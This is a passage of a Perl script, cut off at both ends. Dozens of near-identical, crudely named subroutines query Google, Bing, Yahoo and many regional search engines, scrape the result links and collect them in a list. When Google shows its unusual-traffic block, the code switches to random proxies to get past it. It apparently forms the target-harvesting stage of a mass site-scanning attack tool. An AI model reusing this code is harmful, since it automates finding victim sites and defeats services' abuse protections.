    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack5.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $randombarner[rand(scalar(@randombarner))];

               $jack5 = $rand1."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack5.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack6() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack6.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $randombarner[rand(scalar(@randombarner))];

               $jack6 = $rand1."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack6.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack7() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack7.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $randombarner[rand(scalar(@randombarner))];

               $jack7 = $rand1."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack7.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack8() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack8.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $randombarner[rand(scalar(@randombarner))];

               $jack8 = $rand1."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack8.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack9() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack9.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $randombarner[rand(scalar(@randombarner))];

               $jack9 = $rand1."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack9.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack10() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack10.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $randombarner[rand(scalar(@randombarner))];

               $jack10 = $rand1."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack10.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack11() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack11.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $randombarner[rand(scalar(@randombarner))];

               $jack11 = $rand1."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack11.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}



 

sub jack12() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack12.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $randombarner[rand(scalar(@randombarner))];

               $jack12 = $rand1."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack12.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack13() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack13.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $randombarner[rand(scalar(@randombarner))];

               $jack13 = $rand1."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack13.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack14() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack14.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $randombarner[rand(scalar(@randombarner))];

               $jack14 = $rand1."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack14.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack15() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack15.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $randombarner[rand(scalar(@randombarner))];

               $jack15 = $rand1."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack15.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack16() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack16.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $randombarner[rand(scalar(@randombarner))];

               $jack16 = $rand1."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack16.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack17() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack17.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $randombarner[rand(scalar(@randombarner))];

               $jack17 = $rand1."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack17.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack18() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack18.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $randombarner[rand(scalar(@randombarner))];

               $jack18 = $rand1."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack18.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack19() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack19.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $randombarner[rand(scalar(@randombarner))];

               $jack19 = $rand1."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack19.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack20() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack20.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $randombarner[rand(scalar(@randombarner))];

               $jack20 = $rand1."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack20.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}



sub jack21() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack21.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $randombarner[rand(scalar(@randombarner))];

               $jack21 = $rand1."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack21.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /$badsite/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}



 

sub jack22() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack22.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $randombarner[rand(scalar(@randombarner))];

               $jack22 = $rand1."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack22.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /$badsite/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack23() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack23.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $randombarner[rand(scalar(@randombarner))];

               $jack23 = $rand1."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack23.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /$badsite/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack24() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack24.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $randombarner[rand(scalar(@randombarner))];

               $jack24 = $rand1."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack24.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /$badsite/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack25() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack25.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $randombarner[rand(scalar(@randombarner))];

               $jack25 = $rand1."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack25.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /$badsite/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack26() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack26.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $randombarner[rand(scalar(@randombarner))];

               $jack26 = $rand1."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack26.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /$badsite/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack27() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack27.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $randombarner[rand(scalar(@randombarner))];

               $jack27 = $rand1."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack27.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /$badsite/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack28() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack28.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $randombarner[rand(scalar(@randombarner))];

               $jack28 = $rand1."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack28.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /$badsite/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack29() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack29.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $randombarner[rand(scalar(@randombarner))];

               $jack29 = $rand1."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack29.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /$badsite/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub jack30() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ($jack30.uri_escape($key)."&num=100&start=".$i);

        my $res = search_engine_query($search);

		

		if($res =~ /ipv4\.google\.com/ || $res =~ /ipv6\.google\.com/|| $res =~ /detected\sunusual\straffic/) {

               $rand1 = $randombarner[rand(scalar(@randombarner))];

               $jack30 = $rand1."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";

               $search = ($jack30.uri_escape($key)."&num=100&start=".$i);

               $res = &search_engine_query($search);

           }

		   

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /$badsite/){

                my @grep = &links($link);

                push(@list,@grep);

				}

			}

		}	

		return @list;

	}

 

sub kontol() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.com/search?q=".uri_escape($key)."&num=100&filter=0&start=".$i);

        my $res = search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub pepek() {

        my @list;

        my $key = $_[0];

        for ($b=0; $b<=100; $b+=1) {

        my $search = ("http://search.walla.co.il/?q=".uri_escape($key)."&type=text&page=".$b);

        my $res = search_engine_query($search);

        while ($res =~ m/<a href=\"http:\/\/(.+?)\" title=/g) {

            my $link = $1;

            if ($link !~ /walla\.co\.il/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub tetek(){

    my @list;

        my $key = $_[0];

        for ($b=1; $b<=1000; $b+=10) {

        my $search = ("http://search.yahoo.com/search?p=".uri_escape($key)."&b=".$b);

        my $res = search_engine_query($search);

        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {

            my $link = $1;

            if ($link !~ /yahoo\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub itil() {

        my @list;

        my $key = $_[0];

        for (my $i=1; $i<=1000; $i+=100) {

                my $search = ("http://uk.ask.com/web?q=".uri_escape($key)."&qsrc=1&frstpgo=0&o=0&l=dir&qid=05D10861868F8C7817DAE9A6B4D30795&page=".$i."&jss=");

                my $res = search_engine_query($search);

                while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

                        if ($link !~ /ask\.com/){

                                my @grep = &links($link);

                                push(@list,@grep);

                        }

                }

        }

        return @list;

}

 

sub nennen() {

        my @list;

        my $key = $_[0];

        my $b   = 0;

        for ($b=1; $b<=400; $b+=10) {

                my $search = ("http://szukaj.onet.pl/".$b.",query.html?qt=".uri_escape($key));

                my $res = search_engine_query($search);

                while ($res =~ m/<a href=\"http:\/\/(.*?)\">/g) {

                        my $link = $1;

                        if ($link !~ /onet|webcache|query/){

                                my @grep = &links($link);

                push(@list,@grep);

                        }

                }

        }

        return @list;

}

 

sub susu() {

    my @list;

        my $key = $_[0];

    my $b   = 0;

        for ($b=10; $b<=200; $b+=10) {

        my $search = ("http://search.yippy.com/search?input-form=clusty-simple&v%3Asources=webplus-ns-aaf&v%3Aproject=clusty&query=".uri_escape($key)."&v:state=root|root-".$b."-20|0&");

        my $res = search_engine_query($search);

                if ($res !~ /next/) {$b=100;}

        while ($res =~ m/<a href=\"http:\/\/(.*?)\"/g) {

            my $link = $1;

            if ($1 !~ /yippy\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub buahdada() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=400; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&first=".$i);

        my $res = search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

                        my $link = $1;

            if ($link !~ /google/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub payudara(){

    my @list;

        my $key = $_[0];

        for ($b=1; $b<=50; $b+=1) {

        my $search = ("http://pesquisa.sapo.pt/?barra=resumo&cluster=0&format=html&limit=10&location=pt&page=".$b."&q=".uri_escape($key)."&st=local");

        my $res = search_engine_query($search);

                if ($res !~ m/Next/i) {$b=50;}

        while ($res =~ m/<a href=\"http:\/\/(.*?)\"/g) {

            my $link = $1;

            if ($1 !~ /\.sapo\.pt/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub kentot() {

  my @list;

  my $key = $_[0];

    for ($b=0; $b<=50; $b+=1) {

        my $search = ("http://search.lycos.com/web?q=".uri_escape($key)."&pn=".$b);

        my $res = search_engine_query($search);

        while ($res =~ m/title=\"http:\/\/(.*?)\"/g) {

            my $link = $1;

            if ($link !~ /lycos\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;      

}

 

sub emel() {

        my @list;

        my $key = $_[0];

    for ($b=0; $b<=1000; $b+=10) {

        my $search = ("http://busca.uol.com.br/web/?ref=homeuol&q=".uri_escape($key)."&start=".$b);

        my $res = search_engine_query($search);

                if ($res =~ m/retornou nenhum resultado/i) {$b=500;}

        while ($res =~ m/href=\"?http:\/\/([^\">]*)\"/g) {

            my $link = $1;

            if ($link !~ /uol\.com\.br|\/web/i){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub oral() {

  my @list;

  my $key = $_[0];

    for ($b=0; $b<=50; $b+=1) {

        my $search = ("http://www.hotbot.com/search/web?pn=".$b."&q=".uri_escape($key));

        my $res = search_engine_query($search);

                if ($res =~ m/had no web result/i) {$b=50;}

        while ($res =~ m/href=\"http:\/\/(.+?)\" title=/g) {

            my $link = $1;

            if ($link !~ /hotbot\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;      

}

 

sub klitoris() {

        my @list;

        my $key = $_[0];

        for ($b=0; $b<=300; $b+=10) {

                my $search = ("http://search.aol.com/aol/search?q=".uri_escape($key)."&page=".$b);

                my $res = search_engine_query($search);

                while ($res =~ m/href=\"http:\/\/(.*?)\"/g) {

                        my $link = $1;

                        if ($link !~ /aol\.com/){

                                my @grep = &links($link);

                                push(@list,@grep);

                        }

                }

        }

        return @list;

}

 

sub masturbasi() {

  my @list;  

  my $key = $_[0];  

  for ($b=1; $b<=500; $b+=10) {

  #  $num += $num;

    my $search = "http://cgi.search.biglobe.ne.jp/cgi-bin/search-st_lp2?start=".$b."&ie=utf8&num=".$num."&q=".uri_escape($key)."&lr=all";

    my $res = search_engine_query($search);

    while ( $res =~ m/<a href=\"http:\/\/(.+?)\"/g ) {

            my $link = $1;

        if ($link !~ /biglobe/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub onani() {

  my @list;

  my $key = $_[0];

  my $b   = 0;

  my @doms = ("nl","au","br","ca","de","es","fr","it","uk");

  foreach my $domain (@doms) { #$dom = $doms[rand(scalar(@doms))];

    for (my $i=1; $i<=1000; $i+=100) {

        my $search = ("http://".$domain.".search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);

        my $res = search_engine_query($search);

        while ($res =~ m/http\%3a\/\/(.+?)\//g) {

            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);

				}

			}

		} return @list;

	}

}

 

sub sperma() {

    my @list;

    my $key = $_[0];

    for (my $i=10; $i<=1000; $i+=100){

        my $search = ("http://www.kvasir.no/alle?offset=".$i."&q=".uri_escape($key)."");

        my $res = search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.+?)\//g) {

            my $link = $1; if ($link !~ /kvasir/){ $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub anal() {

    my @lst;

    my $key = $_[0];

    for (my $i=0; $i<=50; $i+=1){

        my $search = ("http://zuhrina.com/google/search.php?q=".uri_escape($key)."&num=100&filter=N&start=".$i."&sa=N");

        my $res = search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/(.+?)\//g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@lst,@grep);

            }

        }

    }

    return @lst;

 }  

        

               

sub puting() {

    my @list;

    my $key = $_[0];

    for ($b=1; $b<=1000; $b+=100) {

        my $search = ("http://search.seznam.cz/?q=".uri_escape($key)."&count=10&pId=SkYLl2GXwV0CZZUQcglt&from=".$b);

        my $res = search_engine_query($search);

        while ($res =~ m/<a href=\"http:\/\/(.+?)\" title/g) {

            if ($1 !~ /seznam/){

            my $link = $1;

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub vagina(){

    my @list;

    my $key = $_[0];

    my $i   = 0;

    for ($i=0; $i<=100; $i+=1){

        my $web=("http://startgoogle.startpagina.nl/index.php?q=".uri_escape($key)."&start=".$i."&origin=homepage&source=geentaal");           

        my $Res= search_engine_query($web);

        while ($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){

            if ($1 !~ /pagina|pagina's/){

                my $k=$1;

                my @grep=&links($k);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub penis(){

        my @list;

        my $key = $_[0];

        for($b=1;$b<=1000;$b+=100){

                my $Th=("http://www.google.pt/search?q=".uri_escape($key)."&in=Mundial&num=25&ckWhere=Mundo&position=".$b."");

                my $Res=search_engine_query($Th);

                while($Res =~ m/href=\"http:\/\/(.+?)\//g){

                        my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);

                }

        }

return @list;

}

 

 sub ZuhRina() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://zuhrina.com/google/search.php?q=".uri_escape($key)."&num=100&filter=N&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /google/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}



sub memek() {

  my @list;

    my $key = $_[0];

